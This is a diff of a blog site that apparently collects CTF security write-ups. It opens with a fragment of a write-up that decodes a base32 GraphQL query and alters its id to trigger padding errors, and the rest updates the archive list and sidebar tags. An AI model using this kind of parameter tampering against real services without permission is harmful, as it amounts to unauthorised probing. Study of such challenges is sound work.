 <p>我们解码一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
 <p>并且根据url，判断出是graphql，一个查询API<br>我们随便改一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
 <p>发现报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GraphQLLocatedError(&apos;Incorrect padding&apos;,), GraphQLLocatedError(&apos;Incorrect padding&apos;,), GraphQLLocatedError(&apos;Incorrect padding&apos;,)]</span><br></pre></td></tr></table></figure></p>
@@ -4406,6 +4406,34 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 214
@@ -4421,6 +4449,11 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2020/06/21/2019-TMCTF-Final-Hack-Server/" >2019 TMCTF Final & Hack Server</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4618,7 +4651,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >Pwnhub-Always be with U-Writeup</a>
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >2019 Pwnhub-Always be with U-Writeup</a>
         </li>
     
     
@@ -4633,12 +4666,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
         </li>
     
     
@@ -4658,12 +4691,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019安恒杯-2月月赛Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/" >2019-Hgame-Week4-Crypto&MixedRSA_Easy</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019 安恒杯 2月月赛 Writeup</a>
         </li>
     
     
@@ -4673,32 +4701,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019-Hgame-Week4-Crypto&Sign_in_SemiHard</a>
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019 Hgame Week4 Crypto&Sign_in_SemiHard</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019-Hgame-Web-Week4</a>
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019 Hgame Web Week4 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019-Hgame-Web&Crypto-Week3</a>
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019 Hgame Web&Crypto Week3 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019-Hgame-Web-Week2</a>
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019 Hgame Web Week2 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019-Hgame-Web-Week1</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019 Hgame Web Week1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019安恒1月月赛Writeip</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019 安恒杯 1月月赛 Writeup</a>
         </li>
     
     
@@ -4732,7 +4760,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018SWPUCTF-Web</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018 SWPUCTF Web</a>
         </li>
     
     
@@ -4742,7 +4770,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018安恒杯11月月赛writeup</a>
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018 安恒杯 11月月赛writeup</a>
         </li>
     
     
@@ -4752,12 +4780,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018-Xctf Final&LCTF-Bestphp</a>
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018 Xctf Final LCTF-Bestphp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >EIS-2018-web</a>
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >2018 EIS web</a>
         </li>
     
     
@@ -4772,7 +4800,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018上海大学生信息安全竞赛-web</a>
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018 上海大学生信息安全竞赛 web</a>
         </li>
     
     
@@ -4782,12 +4810,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018护网杯-web-writeup</a>
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018 护网杯 web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯-9月月赛Writeup</a>
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯 9月月赛Writeup</a>
         </li>
     
     
@@ -4817,7 +4845,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018安恒8月赛Writeup</a>
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018 安恒8月赛 Writeup</a>
         </li>
     
     
@@ -4842,7 +4870,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018WhiteHat-writeup</a>
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018 WhiteHat writeup</a>
         </li>
     
     
@@ -4862,7 +4890,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >2018 RealWorld Web Writeup</a>
         </li>
     
     
@@ -4897,17 +4925,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >2018 ISITDTU CTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >2018 MeePwn-Web-复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >巅峰极客-Web补题</a>
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >2018 巅峰极客-Web补题</a>
         </li>
     
     
@@ -4952,17 +4980,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
@@ -4997,7 +5025,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >2018 DDCTF-bitcoin-51%Attack</a>
         </li>
     
     
@@ -5027,17 +5055,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >2018 0ctf-ezdoor</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >0ctf-login me</a>
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >2018 0ctf-login me</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >2018 pwnhub time injection带来的新思路</a>
         </li>
     
     
@@ -5137,12 +5165,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018安恒一月月赛部分题解</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018 安恒一月月赛部分题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >2018 XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
         </li>
     
     
@@ -5191,12 +5219,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >安恒12月赛之VSCMS审计</a>
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >2017 安恒12月赛之VSCMS审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >安恒杯-12月月赛</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >2017 安恒杯-12月月赛</a>
         </li>
     
     
@@ -5206,7 +5234,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >pwnhub成功就是要梭哈之学习记录</a>
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >2017 pwnhub成功就是要梭哈之学习记录</a>
         </li>
     
     
@@ -5236,12 +5264,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >湖湘杯复赛web400</a>
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >2017 湖湘杯复赛web400</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >湖湘杯复赛web题解</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >2017 湖湘杯复赛web题解</a>
         </li>
     
     
@@ -5261,32 +5289,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >hctf的3道web题题解</a>
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >2017 hctf的3道web题题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >上海赛的RSA研究</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >2017 上海赛的RSA研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >上海线上赛web题解</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >2017 上海线上赛web题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >XDCTF线下赛经历及感悟</a>
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >2017 XDCTF线下赛经历及感悟</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >安恒总决赛的一道代码审计</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >2017 安恒总决赛的一道代码审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >geekgame部分web题解</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >2017 geekgame部分web题解</a>
         </li>
     
     
@@ -5296,7 +5324,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >BDCTF第一轮初赛web题解</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >2017 BDCTF第一轮初赛web题解</a>
         </li>
     
     
@@ -5341,7 +5369,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >Xman线下赛源码审计</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >2017 Xman线下赛源码审计</a>
         </li>
     
     
@@ -5528,61 +5556,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
-    
-        <span class="sidebar-tag-name" data-tags="Flow-Analysis"><span class="iconfont-archer">&#xe606;</span>Flow-Analysis</span>
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
-    
-        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
-    
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
-    
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
-    
-        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
-    
-        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
-    
-        <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
-    
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
-        <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
-    
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
-    
-        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
-    
-        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
     
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
+    
+        <span class="sidebar-tag-name" data-tags="ml"><span class="iconfont-archer">&#xe606;</span>ml</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -5621,19 +5607,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="Flow-Analysis"><span class="iconfont-archer">&#xe60a;</span>Flow-Analysis</span>
-    
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
-    
-        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
-    
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
-        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
